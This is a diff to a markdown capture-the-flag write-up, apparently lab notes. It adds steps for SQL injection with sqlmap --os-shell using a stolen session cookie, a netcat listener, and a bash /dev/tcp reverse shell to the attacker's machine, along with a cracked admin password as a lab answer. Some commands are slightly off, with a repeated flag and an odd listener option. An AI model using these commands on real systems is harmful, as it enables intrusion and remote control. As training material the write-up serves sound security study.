@@ -45,7 +45,7 @@ ftp {target_machine_ip}
 **Answer: zip2john** 
 
 
-**What is the password for the admin user on the website?**
+##What is the password for the admin user on the website?
 
 1. Let's run the `zip2john` script to crack the password. First let's obtain the password hashes.
    ```bash
@@ -86,6 +86,40 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin-hash.txt
 **Answer: qwerty789**
 
 
+## What option can be passed to sqlmap to try to get command execution via the sql injection?
+
+1. Login using username `admin` and password `qwerty789`
+2. Go to browser and get the cookie `PHPSESSID` value
+![Screenshot 2024-02-22 at 12 45 40 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9954818a-ad05-4789-9292-8b6e202e1b8a)
 
 
+
+3. Next as we view with the page after we login, we can see one possible form to attack with SQL injection. We observe that submitting it appends a query parameter `search`
+![Screenshot 2024-02-22 at 12 49 49 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/6f874149-cb51-4d73-81a8-488be978f271)
+
+4. Let's use sqlmap and run the following.
+
+```bash
+sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}" --os-shell
+
+sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}" --os-shell --os-shell
+```
+5. We have spawned a os-shell with user postgres. However executing `sudo -l` does not yield any meaningful results. The os-shell is limited in commands it can execute. It is not interactive 
+
+![Screenshot 2024-02-22 at 12 56 35 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/508193c6-850c-405d-89c9-8c13377c2e08)
+
+5. Let's go to our attack machine and create a netcat listner server
+
+   ```bash
+  nc -lvnp 5000 -e /bin/bash
+   ```
+
+6. On our target machine running sqlmap os-shell let's connect to our server to spawn a reverse shell.
+
+   ```bash
+ bash -c  "bash -i >& /dev/tcp/{attack_machine_ip}/5000  0>&1"
+   ```
+
+7. We have spawned a reverse shell however we do not have an interactive shell yet.
+![Screenshot 2024-02-22 at 1 11 58 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e4502837-7e73-4692-8d16-6c07b0d3aae5)
 
